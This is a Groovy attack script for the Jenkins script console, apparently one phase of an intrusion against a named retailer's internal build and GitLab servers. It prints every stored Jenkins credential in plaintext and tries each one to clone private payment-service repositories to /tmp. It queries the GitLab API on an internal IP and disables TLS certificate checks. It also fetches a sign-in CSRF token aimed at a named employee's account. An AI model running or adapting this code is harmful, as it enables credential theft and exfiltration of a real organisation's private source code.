// PHASE 5: Use Jenkins credential store to git clone GitLab repos
// Jenkins has credential 'jenkis' that works for git ops
// Use the credential binding API to extract plaintext and clone

import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.impl.*
import com.cloudbees.plugins.credentials.domains.Domain

// ===== PART 1: Extract working GitLab credentials from store =====
println "=== PART 1: EXTRACT ALL CREDENTIALS ==="
def allCreds = CredentialsProvider.lookupCredentials(
    UsernamePasswordCredentialsImpl.class,
    Jenkins.instance,
    null, null
)
def gitlabCreds = [:]
allCreds.each { c ->
    println "  ID=${c.id} user=${c.username} pass=${c.password.plainText}"
    gitlabCreds[c.id] = [user: c.username, pass: c.password.plainText]
}

// ===== PART 2: Try git clone with each credential =====
println "\n=== PART 2: GIT CLONE ATTEMPT ==="

def glBase = "http://gitlab.dev.claroshop.com"
def destBase = "/tmp/gl_clone_"

// First try the specific credential IDs for GitLab
def tryClone = { credId, repoPath ->
    def c = gitlabCreds[credId]
    if (!c) return "NO CRED"
    
    def user = java.net.URLEncoder.encode(c.user, "UTF-8")
    def pass = java.net.URLEncoder.encode(c.pass, "UTF-8")
    def cloneUrl = "${glBase}/${repoPath}.git".replace("http://", "http://${user}:${pass}@")
    def dest = "${destBase}${repoPath.replace('/','_')}"
    
    // Clean old clone
    ["bash","-c","rm -rf '${dest}'"].execute().waitFor()
    
    def proc = ["bash","-c","GIT_TERMINAL_PROMPT=0 git -c http.sslVerify=false clone --depth=1 '${cloneUrl}' '${dest}' 2>&1"].execute()
    proc.waitForOrKill(30000)
    def out = proc.text?.take(200)
    
    def d = new File(dest)
    return d.exists() ? "SUCCESS files=${d.list()?.join(',')}" : "FAIL: ${out}"
}

// Known repos to try
def repos = [
    "claroshop/caja-pagos-api",
    "claroshop/payment-bank-deposit-api",
    "claroshop/claropay-api",
    "claroshop/caja-api",
    "claroshop/tienda",
    "sears/mesa-regalo-api",
    "sears/sears-api",
    "locales/Locales",
]

// Try with all credential IDs
["jenkis", "cs-dev-gitlab-jenkins", "0d8e0f66-71a2-43f5-8bd5-1be22a53c656", "GitLabClaro", "gitlabClaroshop"].each { credId ->
    println "\n  Testing credId: ${credId}"
    repos.take(3).each { repo ->
        def result = tryClone(credId, repo)
        println "    ${repo}: ${result}"
        if (result.startsWith("SUCCESS")) return
    }
}

// ===== PART 3: List all GitLab groups via HTTP (not HTTPS) =====
println "\n=== PART 3: HTTP GITLAB API (no redirect follow) ==="
// The jobs use http:// not https://
def gCreds = gitlabCreds["jenkis"] ?: gitlabCreds["cs-dev-gitlab-jenkins"]
if (gCreds) {
    def enc = (gCreds.user + ":" + gCreds.pass).bytes.encodeBase64().toString()
    
    // Try HTTP directly
    ["http://gitlab.dev.claroshop.com", "http://172.27.140.134"].each { base ->
        try {
            def conn = new URL(base + "/api/v4/projects?per_page=100").openConnection()
            conn.connectTimeout = 8000; conn.readTimeout = 15000
            conn.setRequestProperty("Authorization", "Basic " + enc)
            conn.setInstanceFollowRedirects(true)
            def code = conn.responseCode
            def body = (code < 400 ? conn.inputStream : conn.errorStream)?.text?:""
            println "  HTTP ${base}: [${code}] ${body.take(500)}"
        } catch(e) { println "  HTTP ${base}: ERR ${e.message?.take(80)}" }
    }
}

// ===== PART 4: Try maria.policarpo API token generation =====
println "\n=== PART 4: CHECK GITLAB WEB LOGIN (maria.policarpo) ==="
import javax.net.ssl.*
import java.security.cert.*
def tm = [new X509TrustManager() {
    void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) {}
    void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) {}
    java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0] }
}] as TrustManager[]
def sc = SSLContext.getInstance("TLS")
sc.init(null, tm, new java.security.SecureRandom())
HttpsURLConnection.setDefaultSSLSocketFactory(sc.socketFactory)
HttpsURLConnection.setDefaultHostnameVerifier { h, s -> true }

// Check GitLab sign-in page
try {
    def r = new URL("https://gitlab.dev.claroshop.com/users/sign_in").openConnection()
    r.connectTimeout = 8000; r.readTimeout = 10000
    r.setInstanceFollowRedirects(true)
    def code = r.responseCode
    def body = (code < 400 ? r.inputStream : r.errorStream)?.text?:""
    println "  Sign-in page: [${code}] ${body.take(200)}"
    // Extract authenticity_token
    def tokenMatch = body =~ /name="authenticity_token" value="([^"]+)"/
    if (tokenMatch) println "  CSRF Token: ${tokenMatch[0][1]}"
} catch(e) { println "  Sign-in ERR: ${e.message?.take(80)}" }

println "\n=== DONE PHASE 5 ==="
